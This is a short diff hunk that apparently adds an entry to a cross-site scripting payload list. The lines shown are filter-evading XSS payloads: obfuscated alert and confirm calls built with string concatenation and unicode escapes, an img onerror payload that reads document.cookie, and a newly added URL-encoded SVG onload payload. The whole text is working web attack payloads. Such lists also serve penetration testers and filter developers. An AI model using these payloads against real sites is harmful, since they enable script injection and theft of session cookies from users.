@@ -12,3 +12,4 @@ document['default'+'View'][`\u0061lert`](3)
 this.ownerDocument.defaultView['\u0061lert'](4)
 confirm?.(1)
 <img src=”invalid-image” onerror=”alert(document.cookie)”>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
